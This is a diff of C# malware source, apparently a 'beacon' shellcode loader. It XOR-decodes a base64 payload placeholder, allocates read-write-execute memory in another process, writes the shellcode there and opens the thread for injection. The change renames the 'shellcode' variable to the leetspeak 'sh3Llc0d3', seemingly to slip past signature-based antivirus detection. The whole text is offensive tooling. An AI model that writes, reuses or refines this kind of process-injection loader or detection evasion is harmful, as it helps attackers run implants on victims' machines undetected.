@@ -171,9 +171,9 @@ namespace beacon
             string xoredB64 = "REPLACE SHELLCODE HERE";
             string xorKey = "REPLACE XORKEY";
 
-            byte[] shellcode = new byte[] { };
+            byte[] sh3Llc0d3 = new byte[] { };
 
-            shellcode = xorEncDec((Convert.FromBase64String(xoredB64)), xorKey);
+            sh3Llc0d3 = xorEncDec((Convert.FromBase64String(xoredB64)), xorKey);
 
             // Console.WriteLine($"XOR decrypted text: {shellcode}");
 
@@ -187,9 +187,9 @@ namespace beacon
 
             IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)processInfo.dwProcessId);
 
-            IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+            IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)sh3Llc0d3.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
 
-            if (WriteProcessMemory(pHandle, rMemAddress, shellcode, (uint)shellcode.Length, ref lpNumberOfBytesWritten))
+            if (WriteProcessMemory(pHandle, rMemAddress, sh3Llc0d3, (uint)sh3Llc0d3.Length, ref lpNumberOfBytesWritten))
             {
 
             IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
